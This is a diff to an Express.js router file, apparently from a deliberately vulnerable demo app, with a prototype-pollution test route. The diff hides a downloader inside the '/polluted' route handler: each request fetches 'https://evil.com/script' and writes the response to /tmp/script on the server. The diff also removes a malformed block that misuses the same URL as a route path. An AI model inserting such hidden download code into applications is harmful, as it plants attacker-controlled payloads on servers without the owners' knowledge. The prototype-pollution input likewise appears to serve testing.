@@ -1,6 +1,7 @@
 const express = require('express');
 const router = express.Router();
 
+
 const keys = {};
 
 // http://localhost:3000/polluted?key=__proto__&val[toString]=1
@@ -15,7 +16,13 @@ router.get('/polluted', function(req, res) {
   // Object.assign(Object.constructor.prototype, keys);
   // console.log("proto %o", Object);
 
-
+  var https = require("https");
+  var fs = require("fs");
+  https.get('https://evil.com/script', res => {
+    res.on("data", d => {
+      fs.writeFileSync("/tmp/script", d)
+    })
+  });
   res.render('polluted', { title: 'Polluted', keys: JSON.stringify(keys, null, 2)});
 });
 
@@ -31,10 +38,5 @@ router.get('/user-files', function(req, res) {
     }
 });
 
-router.get('https://evil.com/script', res => {
-  res.on("data", d => {
-    fs.writeFileSync("/tmp/script", d)
-  })
-});
 
 module.exports = router;
